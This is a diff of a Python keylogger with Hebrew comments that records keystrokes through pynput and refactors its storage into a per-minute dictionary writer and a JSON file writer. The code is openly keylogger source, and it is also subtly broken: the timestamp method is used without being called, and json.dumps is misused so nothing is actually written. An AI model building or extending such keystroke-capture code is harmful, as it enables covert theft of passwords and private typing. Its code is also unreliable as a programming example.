@@ -2,6 +2,7 @@ from abc import ABC,abstractmethod
 from pynput.keyboard import Key,Listener
 import sys
 from datetime import datetime
+from json import dumps
 
 # קלאס שאחראי על ההקלטה מפעיל הקלטה בהדלקה ראשונה
 class KeyLogger:
@@ -44,42 +45,40 @@ class KeyLogger:
 
 
 
-#  מחלקת כותב. מורישה מתודה של כתוב ומתודה של שלח
+#  מחלקה מופשטת של כותב. מורישה מתודה של כתוב ומתודה של שלח
 class IWriter(ABC):
     @abstractmethod
-    def write(key: str):
-        pass
-    @abstractmethod
-    def send(buffer):
+    def write(data: str) -> None:
         pass
 
-
-
-# .מחלקת כתיבה לקובץ. מקבלת נתיב של הקובץ
-# .מתודת כתוב: כותבת הקשות מקלדת למילון ששומר דקות וטקסט 
-# מתודת שלח: שולחת את המילון לקובץ.
-class FileWriter(IWriter):
+# מחלקת כתיבה למילון
+class DictWriter(IWriter):
 
     def __init__(self):
-        self.text_dict = {}        
-        self.file_path = ""
+        self.dct = {}
 
     @staticmethod
     def cur_min():
         return datetime.now().strftime("%d/%m/%Y, %H:%M")
 
-    def write(self, key: str):
-        if self.cur_min not in self.text_dict:
-            self.text_dict[self.cur_min] = key
+    def write(self, key: str) -> None:
+        if self.cur_min not in self.dct:
+            self.dct[self.cur_min] = key
         else:
-            self.text_dict[self.cur_min] += key
+            self.dct[self.cur_min] += key
+        
+# json מחלקת כתיבה לקובץ 
+class FileWriter(IWriter):
 
-    def add_file_path(self):
+    def __init__(self):        
         self.file_path = ""
 
-    def send(self, buffer):
+    def add_file_path(self, path: str) -> None:
+        self.file_path = path
+
+    def write(self, data: str) -> None:
         with open(self.file_path, "a") as file:
-            file.write(self.text_dict)
+            dumps(data, file)
 
 
         
